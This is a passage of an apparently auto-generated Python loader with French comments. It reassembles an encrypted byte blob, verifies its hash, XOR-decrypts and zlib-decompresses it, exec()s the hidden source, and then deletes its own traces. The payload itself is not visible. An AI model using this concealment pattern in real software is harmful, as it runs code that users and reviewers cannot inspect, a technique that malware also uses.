_cm8St94JQVHgjn + _cksMW0hcCDLON5 + _cf6m_vJ35I_Rrb + _cvnFEN_2O1DbPf + _chZXhtZy91q9SZ + _czKTjyGfGUrkfs + _ch4FVm6_5_8vQz + _cy95OOsb7DgQHE + _crwJdYTOdMYB6m + _cuJSu98l521Z_1 + _cb5Y5QNr_XfVlH + _ccGQTP3NizC2Kh + _czxZ5KbgMzyvlx + _chinsJ6r3tAjNc + _cyZMm7U79m0v1q + _csFtdj3DEuOrM5 + _cwC3hycWVjDRAt + _cmaevD_vmvyAP6 + _chJ8AXaaYwnjlA + _clVOinWEaPB4Ma + _clRo2HW1ueaTrj + _cx2P3GQ_vuQL7R + _cqCA7ys76LCmt4 + _cxJhSopYk1u85f + _cyJ28ZVjEn1Jkx + _cv9FBfiAXfZ56l + _cp6a54Sd0jHWPv + _cgiGhipxYDmjRG + _cyicCgA3It2rT7 + _cvYN1tzRVbA1_s + _czin00eiUouNpD + _clec_yPGpyf8AA + _cp6IIj0Kdqszzc + _cfXbSPb_W4HMJx + _ctC4mpq0z8UYXQ + _cc06wU0MEDSgRX + _ceJ1fPaNvddc4X + _ch0BcCYRlXluKM + _cxz1oMnNOjKw9o + _cq1z21oNV5uWH8 + _cj97L3YwI2wJXz + _chbnguI92aux78 + _ctKpUuM1pqg2hM + _ce6wU_kRD6XmmD + _ccNI2AiUjIf5r9 + _ctTONkhYivpBD6 + _cqtIv8C_hsmq2j + _cbZbGXcd3PRZ3L + _cwpPxneNzxaHSt + _cj6CelRt61vefc + _ceOdOccMMW9tJS + _cuYEsDrcCPw7wm + _cm6Dm2E7ILvx05 + _cyC2uTeOJ01yqd + _caWbj5lV3MgN8V + _cihJCfaI5562d2 + _cqxiSn_ONWGjYw + _cfs_GO2qtZJxKI + _cb6AwsQmoeXatp + _cpR7bwhGAY4p1J + _ceA7qQjSjDqNch + _cwqznbF_qQw7i7 + _ciJ9M8BhffvUud + _cqKTWQcHT_h4Gy + _cb3fViM72bGEyP + _ckbW8U5moN5a7T + _czKIfiNwJ5eFgP)
if __import__('hashlib').sha256(_ppUBiq1S71xW40).hexdigest() != '9afeb7a90cc04088a394e1c12d2f7cdb8a01918813c82ed1900da9dc2ad7249e':
    __import__('sys').exit(1)
_xxkijjbUqprmGa = bytes([198, 30, 246, 23, 88, 65, 63, 99, 81, 175, 109, 243, 42, 213, 229, 31])
_fkwfb9RS57Sp2Pv = bytes([61, 66, 100, 100, 42, 19, 102, 124, 207, 229, 60, 64, 171, 178, 137, 151])

def _fxna9_8uuWol2Ya(_bmAtTGHtqtPERl, _kaEb6Nv9hhxfps):
    return bytes(_bmAtTGHtqtPERl[_ijEd6xcVR3ddmr] ^ _kaEb6Nv9hhxfps[_ijEd6xcVR3ddmr % len(_kaEb6Nv9hhxfps)] for _ijEd6xcVR3ddmr in range(len(_bmAtTGHtqtPERl)))

def _fdm3Qzfv47c4R7X(_to75jAgq477Aus):
    import zlib
    return zlib.decompress(_to75jAgq477Aus) # Un seul niveau de zlib ici pour simplifier

def _fepJOPYIiwmMzqL():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xkNydPMdQEvNAs = _fxna9_8uuWol2Ya(_ppUBiq1S71xW40, _xxkijjbUqprmGa)
    # 2. Décompression Zlib
    _dkqiNNpKrTUjZW = _fdm3Qzfv47c4R7X(_xkNydPMdQEvNAs)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dkqiNNpKrTUjZW.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nmt0tRgUgrJpZN = _main.__dict__
    _nmt0tRgUgrJpZN.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nmt0tRgUgrJpZN)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fepJOPYIiwmMzqL()
try:
    del _fxna9_8uuWol2Ya, _fdm3Qzfv47c4R7X, _fepJOPYIiwmMzqL
    del _ppUBiq1S71xW40, _xxkijjbUqprmGa, _fkwfb9RS57Sp2Pv
except:
    pass
